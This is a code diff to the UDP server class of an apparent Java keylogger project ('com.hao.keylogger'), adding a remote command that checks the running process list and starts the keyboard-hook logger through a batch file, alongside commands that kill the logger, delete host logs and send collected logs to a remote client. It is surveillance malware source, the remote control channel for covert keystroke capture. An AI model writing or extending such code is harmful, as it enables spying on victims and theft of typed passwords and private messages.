@@ -1,17 +1,18 @@
 package com.hao.keylogger.controllers.server;
 
+import java.io.BufferedReader;
 import java.io.File;
-import java.io.FileFilter;
 import java.io.IOException;
+import java.io.InputStreamReader;
 import java.net.DatagramPacket;
 import java.net.DatagramSocket;
 import java.net.InetAddress;
 import java.net.SocketException;
 import java.net.UnknownHostException;
-import java.nio.file.Paths;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.StringTokenizer;
+
 import com.hao.keylogger.models.Resources;
 import com.hao.keylogger.utils.FileManager;
 
@@ -26,7 +27,7 @@ public class UDPServerHelper {
 	private InetAddress hostAddress;
 	private String hostName;
 	private int hostPort;
-	
+
 	private InetAddress clientAddress;
 	private int clientPort;
 
@@ -93,13 +94,12 @@ public class UDPServerHelper {
 		public void run() {
 			inPacket = new DatagramPacket(buffer, buffer.length);
 			while (true) {
-				
-				
+
 				try {
-					socket.receive(inPacket);					
+					socket.receive(inPacket);
 					clientAddress = inPacket.getAddress();
 					clientPort = inPacket.getPort();
-					
+
 					String requestMsg = new String(inPacket.getData(), 0, inPacket.getLength());
 					controller.appendToMonitory(CLIENT_TAG + requestMsg);
 
@@ -125,6 +125,11 @@ public class UDPServerHelper {
 					case Resources.STOP_LOGGER:
 						stopLogger();
 						break;
+					case Resources.START_LOGGER:
+						startLogger();
+						break;
+					default:
+						break;
 					}
 
 				} catch (Exception e) {
@@ -133,22 +138,63 @@ public class UDPServerHelper {
 			}
 		}
 
-		private void stopLogger() {
+		private void startLogger() {			
+			// check if key logger is running
+			String line;
+			String pidInfo = "";
+
+			Process p;
 			try {
-				Runtime.getRuntime().exec("taskkill /F /IM HookKeyboard.exe");
+				p = Runtime.getRuntime().exec(System.getenv("windir") + "//system32//" + "tasklist.exe");
+
+				BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
+
+				while ((line = input.readLine()) != null) {
+					pidInfo += line;
+				}
+
+				input.close();
 			} catch (IOException e) {
 				e.printStackTrace();
-				sendMessageToClient("Can not stop logger!");
 			}
-			sendMessageToClient("Logger is stopped!");
+
+			if (pidInfo.contains(Resources.KEY_LOGGER_NAME)) {
+				sendMessageToClient(Resources.START_LOGGER + "?true?Logger started!");
+				return;
+			}
+			
+			// if key logger is not running
+			
+			try {
+				String programPath = new File(Resources.KEY_LOGGER_PATH).getAbsolutePath();
+				Runtime.getRuntime().exec(Resources.START_LOGGER_BATCH_FILE_NAME);
+			} catch (Exception e) {
+				e.printStackTrace();
+				sendMessageToClient(Resources.START_LOGGER + "?false?Can not start logger!");
+			}
+			sendMessageToClient(Resources.START_LOGGER + "?true?Logger started!");
+		}
+
+		private void stopLogger() {
+			try {
+				Runtime.getRuntime().exec("taskkill /F /IM " + Resources.KEY_LOGGER_NAME);
+			} catch (IOException e) {
+				e.printStackTrace();
+				sendMessageToClient(Resources.STOP_LOGGER + "?false?Can not stop logger!");
+			}
+			sendMessageToClient(Resources.STOP_LOGGER + "?true?Logger is stopped!");
 		}
 
 		private void deleteAllHostLogs() {
 			File logFolder = new File(Resources.LOGS_DIRECTORY);
 			for (File f : logFolder.listFiles()) {
-				f.delete();
+				try {
+					f.delete();
+				} catch (Exception e) {
+					sendMessageToClient(Resources.DELETE_ALL_HOST_LOGS + "?false?Can not delete all log files!");
+				}
 			}
-			sendMessageToClient("All logs are deleted!");
+			sendMessageToClient(Resources.DELETE_ALL_HOST_LOGS + "?true?All logs are deleted!");
 		}
 
 		private void getAllLogsAndSend() {
